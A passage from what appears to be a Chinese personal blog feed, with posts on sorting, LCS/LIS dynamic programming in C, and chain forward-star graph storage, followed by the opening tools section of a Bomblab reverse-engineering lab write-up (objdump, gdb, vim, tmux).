class="string">&quot;%d&quot;</span>, &amp;comps[i].power),comps[i].id=i;</span><br><span class="line">    mergesort(<span class="number">1</span>, <span class="number">2</span> * n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= r;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        k = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= <span class="number">2</span> * n;j+=<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(comps[j].power&gt;comps[j+<span class="number">1</span>].power)</span><br><span class="line">               &#123; comps[j].scores ++;</span><br><span class="line">                   win[k] = comps[j];</span><br><span class="line">                   lose[k] = comps[j + <span class="number">1</span>];</span><br><span class="line">               &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                comps[j + <span class="number">1</span>].scores ++;</span><br><span class="line">                win[k] = comps[j + <span class="number">1</span>];</span><br><span class="line">                lose[k] = comps[j];</span><br><span class="line">            &#125;</span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line">        merge(n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, comps[q].id);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>, j = <span class="number">1</span>,k=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=n&amp;&amp;j&lt;=n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(cmp(win[i],lose[j]))</span><br><span class="line">            comps[k++] = win[i++];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            comps[k++] = lose[j++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=n)</span><br><span class="line">        comps[k++] = win[i++];</span><br><span class="line">    <span class="keyword">while</span>(j&lt;=n)</span><br><span class="line">        comps[k++] = lose[j++];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(comp a,comp b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a.scores!=b.scores)</span><br><span class="line">        <span class="keyword">return</span> a.scores &gt; b.scores;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> a.id &lt; b.id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
        <category>排序算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>排序算法</tag>
      </tags>
  </entry>
  <entry>
    <title>线性dp</title>
    <url>/2021/09/25/%E7%BA%BF%E6%80%A7dp/</url>
    <content><![CDATA[<h1 id="最长公共子序列（LOS）"><a href="#最长公共子序列（LOS）" class="headerlink" title="最长公共子序列（LOS）"></a>最长公共子序列（LOS）</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="https://raw.githubusercontent.com/ysjyx7/images/master/img/image-20210925211120449.png" alt="image-20210925211120449"></p>
<h2 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h2><p>​    其实是一个比较显然的dp问题，可以找到一个明显的动态转移方程，我们用$x[n]$和$y[m]$表示两个序列，然后用$c[i][j]$表示以$x[i]$和$y[j]$结尾的最长公共子序列长度，首先，如果$x[i]=y[j]$，那么我们可以直接将这两个都加到目前的子序列中，然后，如果$x[i]\neq y[j]$，那么目前这两个中肯定有一个不属于最长公共序列，那么目前的$c[i][j]$肯定就是$c[i][j-1]$和$c[i-1][j]$中的最大值</p>
<p>​    那么就可以推出动态转移方程</p>
<p><img src="https://raw.githubusercontent.com/ysjyx7/images/master/img/20160529233036349" alt="img"></p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>​    其实现在来看可以写出一个非常朴素的代码，即</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: ysj </span></span><br><span class="line"><span class="comment"> * @Date: 2021-09-25 19:40:16 </span></span><br><span class="line"><span class="comment"> * @Last Modified by: ysj</span></span><br><span class="line"><span class="comment"> * @Last Modified time: 2021-09-25 19:46:38</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a,b) ((a)&gt;(b)?(a):(b))</span></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">100001</span>],b[<span class="number">100001</span>],c[<span class="number">100001</span>][<span class="number">100001</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;b[i]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]==b[j])</span><br><span class="line">            &#123;</span><br><span class="line">                c[i][j] = c[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                c[i][j] = max(c[i - <span class="number">1</span>][j], c[i][j - <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, c[n][n]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h2><p>​    显然时间复杂度和空间复杂度都为$O(n^2)$</p>
<p>​    而这样做是肯定会超时的</p>
<h2 id="简单优化"><a href="#简单优化" class="headerlink" title="简单优化"></a>简单优化</h2><p>​    其实有个比较独特的想法，我们现在输入的序列为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3 1 2 4 5</span><br><span class="line">1 2 3 4 5</span><br></pre></td></tr></table></figure>
<p>​    那我们把第一个输入的序列当成一个基准，那么输入序列就可以进行转化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a b c d e</span><br><span class="line">b c a d e</span><br></pre></td></tr></table></figure>
<p>​    那我们现在其实只需要求第二个序列中的最大上升子序列就行了！</p>
<h2 id="得到该序列"><a href="#得到该序列" class="headerlink" title="得到该序列"></a>得到该序列</h2><p>​    关于上一个问题的解决方案，继续看下一部分即可，这里介绍如何通过已有的dp数组得到该序列，其实根据递推公式倒推回去就行了，或者在得到dp数组的同时就可以开一个数组记录LOS</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">int</span> ans = c[n][n],ans2=c[n][n];</span><br><span class="line">    <span class="keyword">int</span> d[<span class="number">1000</span>];</span><br><span class="line">    <span class="keyword">int</span> i = n, j = n;</span><br><span class="line">    <span class="keyword">while</span>(i&amp;&amp;j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]==b[j])</span><br><span class="line">        &#123;</span><br><span class="line">            d[ans] = a[i];</span><br><span class="line">            ans--;</span><br><span class="line">            i--, j--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(c[i][j]==c[i<span class="number">-1</span>][j])</span><br><span class="line">        &#123;</span><br><span class="line">            i--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            j--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= ans2;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, d[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="最大上升子序列（LIS）"><a href="#最大上升子序列（LIS）" class="headerlink" title="最大上升子序列（LIS）"></a>最大上升子序列（LIS）</h1><h2 id="简单思路"><a href="#简单思路" class="headerlink" title="简单思路"></a>简单思路</h2><p>​    首先可以使用dp，我们定义$dp[i]$表示前$i$个数中以$a[i]$结尾的最长上升子序列长度，那么很容易可以得到状态转移方程$dp[i]=max(dp[i],dp[j]+1),1&lt;=j&lt;i,a[j]&lt;a[i]$也就是说，每次到第$i$个数时，向前找比它小的数，进行对dp数组的维护，要么把这个数加进去，要么不加，具体看大小</p>
<h2 id="基本代码如下"><a href="#基本代码如下" class="headerlink" title="基本代码如下"></a>基本代码如下</h2><p>​    其实思路很简单，最开始的数组定为1即可</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a,b) ((a)&gt;(b)?(a):(b))</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">100001</span>],dp[<span class="number">100001</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">        dp[i]=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;i;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[j]&lt;a[i])</span><br><span class="line">                f[i]=max(f[i],f[j]+<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">    <span class="keyword">int</span> ans=INT_MIN;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        <span class="keyword">if</span>(ans&lt;f[i])</span><br><span class="line">            ans=f[i];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="复杂度分析-1"><a href="#复杂度分析-1" class="headerlink" title="复杂度分析"></a>复杂度分析</h2><p>​    空间复杂度$O(n)$</p>
<p>​    时间复杂度$O(n^2)$</p>
<p>​    还是会超时，所以需要做进一步优化</p>
<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>​    现在我们考虑另一种思路，即还是用一个dp数组，但是$dp[i]$表示长度为$i$的LIS结尾元素最小值，显然对于一个上升子序列，如果结尾越小，越有利于后面接入元素，即越长。也就是我们每次需要维护dp数组，另外需要一个辅助单元来记录当前最长的LIS的长度。</p>
<p>​    对于维护策略，如果当前元素大于dp数组结尾元素，直接接入，否则的话，在dp数组中找到第一个大于等于当前元素的元素，然后去更新这个值，由于dp数组单调递增，可以使用二分查找。</p>
<h2 id="优化后代码如下"><a href="#优化后代码如下" class="headerlink" title="优化后代码如下"></a>优化后代码如下</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: ysj </span></span><br><span class="line"><span class="comment"> * @Date: 2021-09-25 19:40:16 </span></span><br><span class="line"><span class="comment"> * @Last Modified by: ysj</span></span><br><span class="line"><span class="comment"> * @Last Modified time: 2021-09-25 20:08:38</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a,b) ((a)&gt;(b)?(a):(b))</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> pos, data;</span><br><span class="line">&#125;node;</span><br><span class="line">node nodes[<span class="number">100005</span>];</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">100005</span>],low[<span class="number">100005</span>];</span><br><span class="line"><span class="keyword">int</span> ans;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bs</span><span class="params">(<span class="keyword">int</span> right, <span class="keyword">int</span> key)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;nodes[i].data);</span><br><span class="line">        nodes[nodes[i].data].pos = i;</span><br><span class="line">        low[i] = INT_MIN;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;b[i]);</span><br><span class="line">        b[i] = nodes[b[i]].pos;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// low[1] = b[1];</span></span><br><span class="line">    <span class="comment">// ans = 1;</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(b[i]&gt;low[ans])</span><br><span class="line">        &#123;</span><br><span class="line">            low[++ans] = b[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            low[bs(ans, b[i])] = b[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bs</span><span class="params">(<span class="keyword">int</span> right,<span class="keyword">int</span> key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> left = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(left&lt;=right)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (left + right) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(low[mid]&lt;=key)</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            right = mid - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="复杂度分析-2"><a href="#复杂度分析-2" class="headerlink" title="复杂度分析"></a>复杂度分析</h2><p>​    空间复杂度$O(n)$</p>
<p>​    时间复杂度$O(nlogn)$</p>
]]></content>
      <categories>
        <category>算法</category>
        <category>动态规划</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title>链式前向星存图</title>
    <url>/2021/08/22/%E9%93%BE%E5%BC%8F%E5%89%8D%E5%90%91%E6%98%9F/</url>
    <content><![CDATA[<h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>​    链式前向星是一种存放图的数据结构，性能较好，实现起来不算很难，其存放以边为核心</p>
<h1 id="前向星"><a href="#前向星" class="headerlink" title="前向星"></a>前向星</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>​    在了解什么是链式前向星前，我们先说一下什么是前向星。</p>
<p>​    前向星是一种边集数组，我们将边集数组中的每一条边按起点大小排序，如果起点相同就按终点大小排序，然后再记录下以某点为起点的所有边的权值和起始位置</p>
<p>​    一般用len记录所有以i为起点的边在数组中的存储长度，用head记录以i为边集在数组中的第一个存储位置</p>
<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><p>如图所示</p>
<p><img src="/images/例图1.jpg" alt></p>
<p>输入边的顺序为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">2</span></span><br><span class="line"><span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="number">1</span> <span class="number">3</span></span><br><span class="line"><span class="number">4</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">5</span></span><br><span class="line"><span class="number">4</span> <span class="number">5</span></span><br></pre></td></tr></table></figure>
<p>排完序后得到</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">编号： 	<span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span></span><br><span class="line">起点u：	<span class="number">1</span>  <span class="number">1</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">4</span></span><br><span class="line">终点v：	<span class="number">2</span>  <span class="number">3</span>  <span class="number">5</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">1</span>  <span class="number">5</span></span><br><span class="line">head[<span class="number">5</span>]=&#123;<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">-1</span>&#125;</span><br></pre></td></tr></table></figure>
<h1 id="链式前向星"><a href="#链式前向星" class="headerlink" title="链式前向星"></a>链式前向星</h1><p>​    链式前向星是对前向星的一种优化，因为前向星需要用到排序，时间复杂度较高，而链式前向星可以避免排序</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="边结构体"><a href="#边结构体" class="headerlink" title="边结构体"></a>边结构体</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">int</span> next,to,w;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span> <span class="title">edge</span>[1000];</span></span><br><span class="line"><span class="comment">//edge[i].to表示第i条边的终点，edge[i].next表示与第i条边同起点的下一条边的存储位置，edge[i].w表示这条边的权值</span></span><br><span class="line"><span class="keyword">int</span> head[<span class="number">1000</span>];</span><br><span class="line"><span class="comment">//head数组表示以i为起点的第一条边的存储位置，这里实际上是以i为起点的所有边的最后输入的编号，一般初始化为-1</span></span><br></pre></td></tr></table></figure>
<h3 id="加边操作"><a href="#加边操作" class="headerlink" title="加边操作"></a>加边操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> u,<span class="keyword">int</span> v,<span class="keyword">int</span> w)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    edge[cnt].w=w;</span><br><span class="line">    edge[cnt].to=v;</span><br><span class="line">    edge[cnt].next=head[u];</span><br><span class="line">    head[u]=cnt++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>举例如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">edge[<span class="number">0</span>].to = <span class="number">2</span>;     edge[<span class="number">0</span>].next = <span class="number">-1</span>;      head[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">edge[<span class="number">1</span>].to = <span class="number">3</span>;     edge[<span class="number">1</span>].next = <span class="number">-1</span>;      head[<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">edge[<span class="number">2</span>].to = <span class="number">4</span>;     edge[<span class="number">2</span>],next = <span class="number">-1</span>;      head[<span class="number">3</span>] = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">edge[<span class="number">3</span>].to = <span class="number">3</span>;     edge[<span class="number">3</span>].next = <span class="number">0</span>;       head[<span class="number">1</span>] = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">edge[<span class="number">4</span>].to = <span class="number">1</span>;     edge[<span class="number">4</span>].next = <span class="number">-1</span>;      head[<span class="number">4</span>] = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">edge[<span class="number">5</span>].to = <span class="number">5</span>;     edge[<span class="number">5</span>].next = <span class="number">3</span>;       head[<span class="number">1</span>] = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">edge[<span class="number">6</span>].to = <span class="number">5</span>;     edge[<span class="number">6</span>].next = <span class="number">4</span>;       head[<span class="number">4</span>] = <span class="number">6</span>;</span><br></pre></td></tr></table></figure>
<p>从上面容易看出，head储存的是所有数据中最大的，将其当成初始边</p>
<h3 id="遍历操作"><a href="#遍历操作" class="headerlink" title="遍历操作"></a>遍历操作</h3><p>由于head定位数组本身的性质，这里的遍历最后出现的结果是倒过来的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=head[i];j!=<span class="number">-1</span>;j=edge[j].next);</span><br><span class="line">    <span class="comment">//这里表示遍历所有以i为起点的边</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>洛谷P1131</p>
<p>题目大意：给出n个结点的赋权树，给出根节点s，使得s到每个叶子节点的权值相同，需要加上权值的总和</p>
<p>思路：用链式前向星存边，要想使最后的时间相等，需要从叶子节点逐步向上维护，首先找到当前所有兄弟节点的权值的最大值，然后让每个叶子节点的权值增加，更新答案，然后更新这一部分叶子结点的父节点，逐步向上维护即可</p>
<p>代码见下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a, b) (a &gt; b) ? (a) : (b)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> next, to, w;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">edge</span> <span class="title">edges</span>[1000002];</span></span><br><span class="line"><span class="keyword">int</span> head[<span class="number">500001</span>];</span><br><span class="line"><span class="keyword">int</span> cnt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> v)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> u, <span class="keyword">int</span> v, <span class="keyword">int</span> w)</span></span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ans;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, s;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;s);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n; i++)</span><br><span class="line">        head[i] = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> u, v, w;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;u, &amp;v, &amp;w);</span><br><span class="line">        add(u, v, w);</span><br><span class="line">        add(v, u, w);</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(s, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> u, <span class="keyword">int</span> v, <span class="keyword">int</span> w)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    edges[cnt].to = v;</span><br><span class="line">    edges[cnt].w = w;</span><br><span class="line">    edges[cnt].next = head[u];</span><br><span class="line">    head[u] = cnt++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> v)</span><span class="comment">//s是当前搜索结点，v是其父亲节点</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = head[s]; i != <span class="number">-1</span>; i = edges[i].next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (edges[i].to == v)<span class="comment">//因为我们把无向边变成了两条有向边，所以有可能出现这种情况</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        dfs(edges[i].to, s);<span class="comment">//一直搜索到叶子节点</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> maxn = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = head[s]; i != <span class="number">-1</span>; i = edges[i].next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (edges[i].to == v)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        maxn = max(edges[i].w, maxn);<span class="comment">//这一个循环用来找所有和当前节点相邻的边中权值最大的</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = head[s]; i != <span class="number">-1</span>; i = edges[i].next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (edges[i].to == v)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        ans += (maxn - edges[i].w);<span class="comment">//对于每个叶子节点，要想满足条件，只需要更新到当前的maxn即可</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (v == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = head[v]; i != <span class="number">-1</span>; i = edges[i].next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (edges[i].to == s)</span><br><span class="line">            edges[i].w += maxn;<span class="comment">//用来找到当前结点和其父亲节点的那一条边，更新权值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据结构</category>
        <category>特殊数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>特殊数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>Bomblab</title>
    <url>/2022/03/20/Bomblab/</url>
    <content><![CDATA[<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>​    主要是使用<code>vim+gdb</code>，没有使用<code>gdb</code>看反汇编，因为感觉那个看起来不是很舒服。</p>
<p>​    首先用<code>objjump</code>生成反汇编，将它重定向到一个文本文件里，用<code>vim</code>看，然后另外一边用<code>gdb</code>打断点调试，可以用<code>tmux</code>分屏去看，会舒服一点。大概整个布局就像下面这样？右下角的部分有可能编辑一些文件，不过也可以关掉。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326144038902.png" alt="image-20220326144038902"></p>
<p>​    另外因为前面5个炸弹都相对简单，可以把答案写到一个文件里，运行的时候直接带参数运行，这样就不用每次都输入答案了。</p>
<p>​    此外，<code>gdb</code>还有一个<code>layout</code>命令，可以在调试的时候看反汇编。但是在具体使用的时候会有一些奇奇怪怪的问题，所以也没有采用。</p>
